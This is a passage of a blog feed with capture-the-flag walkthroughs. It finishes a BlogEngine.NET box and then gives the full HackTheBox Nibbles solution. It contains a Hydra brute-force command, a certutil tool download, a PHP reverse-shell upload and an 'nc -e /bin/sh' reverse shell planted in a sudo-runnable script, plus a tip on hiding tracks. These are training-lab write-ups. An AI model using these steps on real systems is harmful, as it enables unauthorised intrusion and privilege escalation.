+<pre class="chroma"><code class="language-text" data-lang="text">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.144.161
+[+] Threads:        200
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     aspx,asp
+[+] Timeout:        10s
+===============================================================
+2021/02/21 09:32:51 Starting gobuster
+===============================================================
+/blog.aspx (Status: 200)
+/archives (Status: 200)
+/archive (Status: 200)
+/archive.aspx (Status: 200)
+/search (Status: 200)
+/search.aspx (Status: 200)
+/content (Status: 301)
+/page.aspx (Status: 302)
+/default.aspx (Status: 200)
+/admin (Status: 302)
+/contact_us (Status: 200)
+/contacts (Status: 200)
+/contactus (Status: 200)
+/contact (Status: 200)
+/contact.aspx (Status: 200)
+/account (Status: 301)
+/post.aspx (Status: 302)
+/scripts (Status: 301)
+/contact-us (Status: 200)
+/custom (Status: 301)
+/contactinfo (Status: 200)
+/setup (Status: 302)
+/error.aspx (Status: 200)
+/fonts (Status: 301)
+/contact_off (Status: 200)
+/searchresults (Status: 200)
+/search_form (Status: 200)
+/searchresultsbrief (Status: 200)
+/searchtips (Status: 200)
+/search2 (Status: 200)
+/contact_form (Status: 200)
+/contact_information (Status: 200)
+/archive_query (Status: 200)
+/searching (Status: 200)
+/contactform (Status: 200)
+/search-engines (Status: 200)
+/contacto (Status: 200)
+/search_left (Status: 200)
+/search_results (Status: 200)
+/searchengine (Status: 200)
+/search_tips (Status: 200)
+/contact-info (Status: 200)
+/contact_sales (Status: 200)
+/searchbutton (Status: 200)
+/contact1 (Status: 200)
+/search_off (Status: 200)
+/searchcontent (Status: 200)
+/search_engines (Status: 200)
+/contacting (Status: 200)
+/searchengines (Status: 200)
+/search1 (Status: 200)
+/search_help (Status: 200)
+/search_right (Status: 200)
+/search_engine (Status: 200)
+/contact2 (Status: 200)
+/searchform (Status: 200)
+/searchhelp (Status: 200)
+/search_close (Status: 200)
+/search_icon (Status: 200)
+/contact-me (Status: 200)
+/archives2 (Status: 200)
+/search-new (Status: 200)
+/searches (Status: 200)
+/contact_info (Status: 200)
+/search3 (Status: 200)
+/searchnav (Status: 200)
+/contactus_off (Status: 200)
+/archived (Status: 200)
+/searchbox (Status: 200)
+/search_btn (Status: 200)
+/search_result (Status: 200)
+/archive1 (Status: 200)
+/search-tools (Status: 200)
+/search-top (Status: 200)
+/search_adv (Status: 200)
+/searchtop (Status: 200)
+/searchday (Status: 200)
+/search_header (Status: 200)
+/contact-off (Status: 200)
+/search_attrib (Status: 200)
+/search!default (Status: 200)
+/contactgnw (Status: 200)
+/searchproduct (Status: 200)
+/search_2 (Status: 200)
+/search_view (Status: 200)
+/search_top (Status: 200)
+/searchbar (Status: 200)
+/search_advanced (Status: 200)
+/search_getprod (Status: 200)
+/search_windows (Status: 200)
+/search_1 (Status: 200)
+/searchtools (Status: 200)
+/search_en (Status: 200)
+/search_tools (Status: 200)
+/search_button (Status: 200)
+/contactsales (Status: 200)
+/search-left (Status: 200)
+/contactbutton (Status: 200)
+/contactar (Status: 200)
+/searchindex (Status: 200)
+/contacttables (Status: 200)
+/search-marketing (Status: 200)
+/searchsite (Status: 200)
+/search_nero (Status: 200)
+/search_kaspersky (Status: 200)
+/search_anydvd (Status: 200)
+/search_tomtom (Status: 200)
+/search_vista (Status: 200)
+/contact_en (Status: 200)
+/searchresult (Status: 200)
+/search_for (Status: 200)
+/search_head (Status: 200)
+/search-tips (Status: 200)
+/search_title (Status: 200)
+/contactme (Status: 200)
+/searchstandardra9 (Status: 200)
+/search_site (Status: 200)
+/contact_index (Status: 200)
+/search_n (Status: 200)
+/search-co (Status: 200)
+/search_avi (Status: 200)
+/contact_up (Status: 200)
+/searchinform (Status: 200)
+/search-right (Status: 200)
+/search_advance (Status: 200)
+/searchadv (Status: 200)
+/searchcode (Status: 200)
+/archive2 (Status: 200)
+/searchfor (Status: 200)
+/search_archives (Status: 200)
+/search_rss (Status: 200)
+/contact-tables (Status: 200)
+/contact_editor (Status: 200)
+/search_marketing (Status: 200)
+/search_ (Status: 200)
+/search_v2 (Status: 200)
+/search_www (Status: 200)
+/search_avast (Status: 200)
+/archive-zip (Status: 200)
+/search-engine (Status: 200)
+/searchsecurity (Status: 200)
+/searchleft (Status: 200)
+/searchright (Status: 200)
+/search_3 (Status: 200)
+/search_nav (Status: 200)
+/search_knowledge (Status: 200)
+/contact-form (Status: 200)
+/contactlist (Status: 200)
+/contact-en (Status: 200)
+/search_4 (Status: 200)
+/contact_pair (Status: 200)
+/archive2003 (Status: 200)
+/search-adv (Status: 200)
+/contact_list (Status: 200)
+/archive_news (Status: 200)
+/searcher (Status: 200)
+/contact_management (Status: 200)
+/searchicom (Status: 200)
+/search_web (Status: 200)
+/contact%20us (Status: 200)
+/contact_tables (Status: 200)
+/search-wy (Status: 200)
+/search-me (Status: 200)
+/search-wv (Status: 200)
+/search-tx (Status: 200)
+/search-nm (Status: 200)
+/search-nj (Status: 200)
+/search-id (Status: 200)
+/search-ks (Status: 200)
+/search-mi (Status: 200)
+/search-ia (Status: 200)
+/search-sc (Status: 200)
+/search-ri (Status: 200)
+/search-dc (Status: 200)
+/search-tn (Status: 200)
+/search-nh (Status: 200)
+/search-mt (Status: 200)
+/search-nv (Status: 200)
+/search-vt (Status: 200)
+/search-ok (Status: 200)
+/search-pa (Status: 200)
+/search-la (Status: 200)
+/search-hi (Status: 200)
+/search-fl (Status: 200)
+/search-nc (Status: 200)
+/search-ar (Status: 200)
+/search-de (Status: 200)
+/search-ak (Status: 200)
+/search-al (Status: 200)
+/search-ct (Status: 200)
+/search-ca (Status: 200)
+/search-sd (Status: 200)
+/search-va (Status: 200)
+/search-mo (Status: 200)
+/search-ky (Status: 200)
+/search-ma (Status: 200)
+/search-mn (Status: 200)
+/search-ms (Status: 200)
+/search-ga (Status: 200)
+/search-ut (Status: 200)
+/search-wi (Status: 200)
+/search-or (Status: 200)
+/search-ny (Status: 200)
+/search-md (Status: 200)
+/search-in (Status: 200)
+/search-il (Status: 200)
+/search-az (Status: 200)
+/search-oh (Status: 200)
+/searchview (Status: 200)
+/contact_button (Status: 200)
+/search-16x16 (Status: 200)
+/search_options (Status: 200)
+/searchnews (Status: 200)
+/search_go (Status: 200)
+/contactoff (Status: 200)
+/search_text (Status: 200)
+/search_music (Status: 200)
+/searchreg (Status: 200)
+/contact_details (Status: 200)
+/search_french (Status: 200)
+/search_eragon (Status: 200)
+/search_windows-vista (Status: 200)
+/search_saw (Status: 200)
+/search_porn (Status: 200)
+/search_office-2007 (Status: 200)
+/search_hentai (Status: 200)
+/search_games (Status: 200)
+/search_xxx (Status: 200)
+/search_sex (Status: 200)
+/contact-details (Status: 200)
+/contactenos (Status: 200)
+/archive_2006-m11 (Status: 200)
+/contactusform (Status: 200)
+/searchprofile!input (Status: 200)
+/searchguide (Status: 200)
+/search_index (Status: 200)
+/search_avg (Status: 200)
+/search-events (Status: 200)
+/search_norton (Status: 200)
+/search_spyware-doctor (Status: 200)
+/search_sims (Status: 200)
+/searchall (Status: 200)
+/search-nd (Status: 200)
+/search-wa (Status: 200)
+/search-ne (Status: 200)
+/search-ico (Status: 200)
+/contact_main (Status: 200)
+/contact_icon (Status: 200)
+/search-icon (Status: 200)
+/search_txt (Status: 200)
+/archiver (Status: 200)
+/search_blue (Status: 200)
+/contact_call (Status: 200)
+/archive2001 (Status: 200)
+/archive2004 (Status: 200)
+/search_bottom (Status: 200)
+/search_jobs (Status: 200)
+/contactus-off (Status: 200)
+/search-bool (Status: 200)
+/contact_title (Status: 200)
+/contactus1 (Status: 200)
+/searchwin2000 (Status: 200)
+/search-inside (Status: 200)
+/searchtype (Status: 200)
+/searchout (Status: 200)
+/search_city (Status: 200)
+/search-cat (Status: 200)
+/searchtool (Status: 200)
+/contactbut (Status: 200)
+/search_sweaw (Status: 200)
+/search_dr (Status: 200)
+/search_ediuspro4 (Status: 200)
+/search_tweakmaster (Status: 200)
+/search_msn (Status: 200)
+/contact-lenses (Status: 200)
+/search_office (Status: 200)
+/archive2005 (Status: 200)
+/searchhelppage (Status: 200)
+/search_new (Status: 200)
+/contact_head (Status: 200)
+/contact_support (Status: 200)
+/searchq (Status: 200)
+/archive2006 (Status: 200)
+/archive_2006-m03 (Status: 200)
+/archive_2006-m02 (Status: 200)
+/archive_2006-m04 (Status: 200)
+/contact_new (Status: 200)
+/contact_forms (Status: 200)
+/search-1 (Status: 200)
+/contact_top (Status: 200)
+/search_label (Status: 200)
+/contact_e (Status: 200)
+/contacte (Status: 200)
+/archive_search (Status: 200)
+/searchx (Status: 200)
+/archives_off (Status: 200)
+/search-help (Status: 200)
+/contactless (Status: 200)
+/search97cgi (Status: 200)
+/search_02 (Status: 200)
+/search_01 (Status: 200)
+/search-results (Status: 200)
+/search_preteen (Status: 200)
+/http%3a%2f%2fblog (Status: 200)
+/http%3a%2f%2fblog.aspx (Status: 200)
+/archive_2006-m08 (Status: 200)
+/archive_2005-w16 (Status: 200)
+/archive_2005-w14 (Status: 200)
+/archive_2005-w18 (Status: 200)
+/archive_2006-m12 (Status: 200)
+/archive_2005-w23 (Status: 200)
+/archive_2005-w43 (Status: 200)
+/search-line (Status: 200)
+/contactinformation (Status: 200)
+/search_sm (Status: 200)
+/searchbox_top (Status: 200)
+/contact_offline (Status: 200)
+/contact_www (Status: 200)
+/contact_blog (Status: 200)
+/contact_web (Status: 200)
+/searchnetworking (Status: 200)
+/search-en (Status: 200)
+/contactcw (Status: 200)
+/archives1 (Status: 200)
+/search_winrar (Status: 200)
+/search_nod32 (Status: 200)
+/search_alcohol (Status: 200)
+/contactussupport (Status: 200)
+/archive02 (Status: 200)
+/search_lockdown (Status: 200)
+/contact_remove (Status: 200)
+/searchbottom (Status: 200)
+/searchlogo_dmoz (Status: 200)
+/searchcloud (Status: 200)
+/search_end (Status: 200)
+/searchpro (Status: 200)
+/search_6 (Status: 200)
+/archivespg2 (Status: 200)
+/contactu (Status: 200)
+/contact_address (Status: 200)
+/contact_reseller (Status: 200)
+/contacttitle (Status: 200)
+/contactmap_small (Status: 200)
+/contactmap_large (Status: 200)
+/contactmap_thumb (Status: 200)
+/searchtitle (Status: 200)
+/contact_on (Status: 200)
+/contact_a (Status: 200)
+/search_mnogosearch (Status: 200)
+/archive_tar (Status: 200)
+/archive_zip (Status: 200)
+/archive2002 (Status: 200)
+/archive2000 (Status: 200)
+/search_packages (Status: 200)
+/search_contents (Status: 200)
+/search_search (Status: 200)
+/contact_osdl (Status: 200)
+/searchareaborder (Status: 200)
+/contactvoa (Status: 200)
+/search_on (Status: 200)
+/search_srcheader (Status: 200)
+/contact_addressbook (Status: 200)
+/contact_secunia (Status: 200)
+/searchhistory (Status: 200)
+===============================================================
+2021/02/21 09:36:17 Finished
+===============================================================
+</code></pre></td></tr></table>
+</div>
+</div><p>Checking <code>searchsploit</code> for vuln on <code>IIS 8.5</code> won&rsquo;t reveal anything.</p>
+<p>In the meantime, manual browsing to the website tells us it is a blog, and it is running on <code>BlogEngine.NET</code> which seems to be an Open source blogging platform for ASP / Windows platforms.</p>
+<p>Using <code>searchsploit</code>, we&rsquo;ll discover that some versions are vulnerable to various stuff (including RCE), however we do not know yet, our version.</p>
+<p>However, by looking at the source code of the main page, we&rsquo;ll see that we are using <code>BlogEngine 3.3.6.0</code> :</p>
+<p></p>
+<p>This confirms that our target is vulnerable to RCEs! By reading the RCEs on <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer">Exploit-DB</a>, we see that all of them require access to the admin panel, they are Authenticated RCE. I guess, this is where <code>Hydra</code> will come useful and the <code>http://10.10.144.161/admin</code> URL we found during our previous scans.</p>
+<h3 id="cracking-authentication-with-burp">Cracking authentication with Burp</h3>
+<p>By reading the &ldquo;Get Started with BlogEngine&rdquo;, we learn that default credentials are <code>admin</code> // <code>admin</code>. However, it doesn&rsquo;t work. We will assume that the password has been changed but not the user!</p>
+<p>Before running <code>Hydra</code>, we need to gather URL parameter, I like to use <code>Burp</code> proxy history in order to do so :</p>
+<p></p>
+<p>Then, I&rsquo;ll try to attack it like this :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.106.193 http-post-form &#34;/Account/login.aspx?ReturnURL=%2fadmin:__VIEWSTATE=Q6%2Fwyy29Lyg61L12FTfXHvmaqgecBgtXUIRuiIVZJcFGpkb5tUJh93nSVJyuTgOfHtyLi9OgrKHFNl1seijcfd5djPWqvYuL6snvmS5V63eSntNGRbmzESEkm6ktoT2Dte8ynazWqXYY2eHuMMAEfJW605kE5c0VpnhTqNIq0L2E%2FkNX&amp;__EVENTVALIDATION=gvR4CPW1DPVTT4Sm1GtfP5izsS5fJPp9bKo0SKI3XahFdVSdCQszWrKRTgWPFKxEICXK4t8lOn0TU0fheh7qDW4tv5IcHTzcIQ3ZVX8Mup8bVrtQVspuQDJhG%2B8j5lpl2zcnQjaPXY%2FfwjBMZou39tlG7J8yzxpVlOiY%2BkR3Vd0caNnr&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed&#34; -vV
+</code></pre></td></tr></table>
+</div>
+</div><p>After a few seconds, with a good wordlist, it will find the password :</p>
+<p></p>
+<p>It is time to play with our Authenticated RCEs!</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="getting-initial-shell">Getting initial shell</h3>
+<p>This <a href="https://www.exploit-db.com/exploits/46353" target="_blank" rel="noopener noreferrer">RCE</a> seems to apply to our target and is well written, it explains step by step how to exploit it :</p>
+<ol start="0">
+<li>Setup <code>netcat</code> listener on our attacking box ;</li>
+<li>We create a file called <code>PostView.ascx</code> and modify it with the IP and port of our attacking box ;</li>
+<li>Upload it ;</li>
+<li>Visit URL to trigger to remote shell.</li>
+</ol>
+<p>And it worked :</p>
+<p></p>
+<p>Unfortunately, we are not <code>SYSTEM</code>. Like we guessed during recon, we&rsquo;ll have to elevate our priv.</p>
+<h3 id="privesc">PrivEsc</h3>
+<p>Let&rsquo;s get <code>WinPEAS</code> on our target. I like to use <code>winPEAS.bat</code> and upload via my own machine, serving it with Python module <code>SimpleHTTPServer</code>. Then, I&rsquo;ll download in on target with the following command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">certutil -urlcache -f http://10.11.27.240/winPEAS.bat winPEAS.bat
+</code></pre></td></tr></table>
+</div>
+</div><p>NB : make sure to use a writable folder, such as: <code>C:\Users\Public</code>.</p>
+<p>We run it with :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">winPEAS.bat log
+</code></pre></td></tr></table>
+</div>
+</div><p>The <code>log</code> switch will save output to a log file and display it. Since we are training, there is no problem in saving the log in the remote machine. However, on a real assessment where you could have to hide you tracks, it might be better to simply print the log and copy it manually in order to save it outside the target. In any case, like with scanning tools, it is preferred to run the tool only once and save output. It will make you &ldquo;quieter&rdquo;, which is want you probably want.</p>
+<p>WinPEAS will reveal some <code>Administrator credentials</code> :</p>
+<p></p>
+<p>We try them in RDP, and boom! We are in as <code>SYSTEM</code> :</p>
+<p></p>
+<p>Let&rsquo;s harvest our flags, first user :</p>
+<p></p>
+<p>Then root:</p>
+<p></p>
+<h2 id="outro">Outro</h2>
+<p>In this box, we learned how to use <code>Hydra</code> for credentials cracking and practiced what we&rsquo;ve already been doing before to escalate privileges. A cool little box!</p>
+]]></description></item><item><title>HTB - Nibbles without MetaSploit</title><link>https://www.masoopy.com/htb-nibbles-without-metasploit/</link><pubDate>Wed, 17 Feb 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/htb-nibbles-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/02/Nibbles_Logo.png" referrerpolicy="no-referrer">
-            </div>Intro Easy box, according to HTB notation, also not a very good user&rsquo;s rating. Let&rsquo;s see what it is about!
-Target HTB - Nibbles
-Recon Quick recon according to logo and info :
- Linux box ; Misc : web, misconfiguration.  Enum Classic nmap scan :
-1  sudo nmap -T4 -A -p- -oA scan $target_ip   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  Starting Nmap 7.]]></description></item><item><title>HTB - Devel without MetaSploit</title><link>https://www.masoopy.com/htb-devel-without-metasploit/</link><pubDate>Tue, 16 Feb 2021 15:26:14 +0100</pubDate><author>Author</author><guid>https://www.masoopy.com/htb-devel-without-metasploit/</guid><description>&lt;div class="featured-image">
-&lt;img src="/images/2021/02/Devel_Logo.png" referrerpolicy="no-referrer">
-&lt;/div>Intro Pretty fast and obvious box. Let me guide through my pwn:
-Target HTB - Devel
-Recon Usual recon here, based on logo and info :
-Windows box ; Misc : FTP, Arbitrary file upload. Enum We run our classic nmap scan :
-1 sudo nmap -T4 -A -p- -oA nmap $target_ip 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # Nmap 7.</description></item></channel></rss>
+            </div><h2 id="intro">Intro</h2>
+<p>Easy box, according to HTB notation, also not a very good user&rsquo;s rating. Let&rsquo;s see what it is about!</p>
+<h2 id="target">Target</h2>
+<p><a href="https://app.hackthebox.eu/machines/121" target="_blank" rel="noopener noreferrer">HTB - Nibbles</a></p>
+<h2 id="recon">Recon</h2>
+<p>Quick recon according to logo and info :</p>
+<ul>
+<li>Linux box ;</li>
+<li>Misc : web, misconfiguration.</li>
+</ul>
+<h2 id="enum">Enum</h2>
+<p>Classic <code>nmap</code> scan :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p- -oA scan $target_ip
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 16:42 CET
+Nmap scan report for $target_ip
+Host is up (0.023s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=2/17%OT=22%CT=1%CU=31405%PV=Y%DS=2%DC=T%G=Y%TM=602D399
+OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS
+OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8080/tcp)
+HOP RTT      ADDRESS
+1   23.69 ms 10.10.14.1
+2   24.01 ms $target_ip
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 47.45 seconds
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="web-scanning">Web scanning</h3>
+<p>Let&rsquo;s enumerate web folders in CLI, for a change :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">gobuster dir -u http://$target_ip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .php
+
+</code></pre></td></tr></table>
+</div>
+</div><p>This won&rsquo;t give us much information, however by browsing to the website and checking its source we find a new URL :</p>
+<p></p>
+<p>We fire <code>gobuster</code> one more time, with this new URL :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">gobuster dir -u http://$target_ip/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .php
+
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://$target_ip/nibbleblog/
+[+] Threads:        200
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2021/02/17 16:54:47 Starting gobuster
+===============================================================
+/themes (Status: 301)
+/feed.php (Status: 200)
+/admin (Status: 301)
+/admin.php (Status: 200)
+/plugins (Status: 301)
+/install.php (Status: 200)
+/update.php (Status: 200)
+/languages (Status: 301)
+/index.php (Status: 200)
+/content (Status: 301)
+/sitemap.php (Status: 200)
+===============================================================
+2021/02/17 16:55:21 Finished
+===============================================================p
+</code></pre></td></tr></table>
+</div>
+</div><p>It will reveal juicier info, such as <code>admin.php</code>, <code>install.php</code>, <code>sitemap</code>, etc.</p>
+<p>Going to <code>install.php</code> will tell us the site is already installed and propose to upgrade it which will eventually leak <code>NibbleBlog version 4.0.3</code> :</p>
+<p></p>
+<p>By checking source code on Github, we also find juicy directory in <code>/content/private</code> :</p>
+<p></p>
+<p>Now checking <code>searchsploit</code> we find that our version is vulnerable to <a href="https://www.exploit-db.com/exploits/38489" target="_blank" rel="noopener noreferrer">Authenticated Arbitrary File Upload</a>. It means we need to get the credentials.</p>
+<p>By looking inside the users.xml file we can suppose that <code>admin</code> is the login.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Now, we could try to brute force the admin area, however it won&rsquo;t be effective since Nibbleblog will temporarily block our IP after a few attempts:</p>
+<p></p>
+<p>Here, again, I spent way more time than I care to admit. You have to find the password, but can&rsquo;t &ldquo;crack&rdquo; it which means we have to guess it. I tried a lot of stuff&hellip; but couldn&rsquo;t find it, so I cheated&hellip; again!</p>
+<p>We know the password is <code>admin</code>, and the password is <code>nibbles</code>, like the box&rsquo;s name (which I tried), but I uesd a capital <code>N</code>.</p>
+<p></p>
+<p>Now that we have our credentials, we can finally start playing with the CVE we found earlier! Since, we are trying to solve this without MetaSploit, we need to find a <a href="https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html" target="_blank" rel="noopener noreferrer">manual way</a> to exploit our target.</p>
+<h3 id="getting-initial-shell">Getting initial shell</h3>
+<p>Let&rsquo;s create a [php shell(https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)], thanks to Pentest Monkey and upload it via the Image plugin located at <code>http://$target_ip/nibbleblog/admin.php?controller=plugins&amp;action=config&amp;plugin=my_image</code>, then we will run shell my going to this URL : <code>http://$target_ip/nibbleblog/content/private/plugins/my_image/image.php</code>. The filename will always be <code>image.ext</code> with <code>ext</code> being the &ldquo;real&rdquo; extension.</p>
+<p>NB : do not forget to start your listener : <code>nc -nlvp 1234</code>.</p>
+<p>And we are in, unfortunately as <code>nibbler</code> and not <code>root</code> :</p>
+<p></p>
+<p>Let&rsquo;s still grab the user flag :</p>
+<p></p>
+<p>And now&hellip; we need to escalate our priv!</p>
+<h3 id="privesc">PrivEsc</h3>
+<p>Before we can have a chance to elevate our privs, we should do more <a href="https://www.masoopy.com/cheatsheets/got-shell/" target="_blank" rel="noopener noreferrer">internal recon</a>.</p>
+<p>We&rsquo;ll upload <a href="https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" target="_blank" rel="noopener noreferrer">LSE</a>, in order to check for any &ldquo;entry points&rdquo; to privileges escalation.</p>
+<p>We will serve our script via <code>sudo python2 -m SimpleHTTPServer 80</code> since our target doesn&rsquo;t seem to resolve Github&rsquo;s domain&rsquo;s and download it with <code>curl</code>.</p>
+<p>Once it downloaded, give it exec right, then run it. Something interesting will come up :</p>
+<p></p>
+<p>This means that we&rsquo;ll be able to run anything as <code>root</code> as long as it is in <code>/home/nibbler/personal/stuff/monitor.sh</code>.</p>
+<p>All right! Let&rsquo;s try to run a reverse shell :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">cd /home/nibbler
+echo &#34;#!/bin/bash&#34; &gt; personal/stuff/monitor.sh
+echo &#34;nc -e &#34;/bin/sh&#34; $attacking_ip 1235&#34; &gt;&gt; personal/stuff/monitor.sh
+chmod +x personal/stuff/monitor.sh
+</code></pre></td></tr></table>
+</div>
+</div><p>Now we run it :</p>
+<p><code>sudo /home/nibbler/personal/stuff/monitor.sh</code></p>
+<p>NB : don&rsquo;t forget to start the listener on your attacking machine.</p>
+<p>And that&rsquo;s it, we have root :</p>
+<p></p>
+<p>And we grab the last flag  :</p>
+<p></p>
+<h2 id="outro">Outro</h2>
+<p>Let me be blunt. Getting the admin&rsquo;s password sucked, and was no fun at all. By judging from the comments on the forum and the poor notation, I guess I wasn&rsquo;t the only one really frustrated while trying to get initial access. However, once I was in, while it was pretty easy, it was also super fun and really enjoyed this box!</p>
